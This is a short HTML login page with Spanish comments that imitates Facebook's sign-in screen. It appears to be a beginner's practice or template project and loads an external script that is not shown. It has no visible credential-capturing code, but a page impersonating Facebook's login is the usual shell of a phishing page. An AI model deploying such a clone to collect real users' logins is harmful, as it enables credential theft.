<!DOCTYPE html>
<html>


<head>
  <title>Página de inicio de sesión</title> <!-- Título de la página Cambiar a unionColombia Proyecto -->
  <link rel="stylesheet" type="text/css" href="style.css"> <!-- Llamado al archivo css -->
</head>


<body>


  <h1 id="titulo">Facebook</h1>
  <div class="container">
    <h1>Iniciar sesión en Facebook</h1>
    <form id="login-form">


      <label for="email">Correo electrónico o número de teléfono:</label>
      <input type="text" id="email" name="email" required>

      <!-- crea un campo de contraseñas -->
      <input type="text" id="contraseña" name="contraseña" required>

      <button type="submit" id="login-button">Iniciar sesión</button>


             

      <a href="https://youtu.be/PR2uBPoqzb8">¿OLVIDASTE TU CONTRASEÑA?</a>

      <!-- Añade tu código aquí para crear un botón de "¿Has olvidado la contraseña?" -->

      <input type="submit" value="Crear cuenta nueva">

    </form> 
   </div>
  <script src="script.js"></script> <!-- Llamado al archivo js -->
</body>
</html>
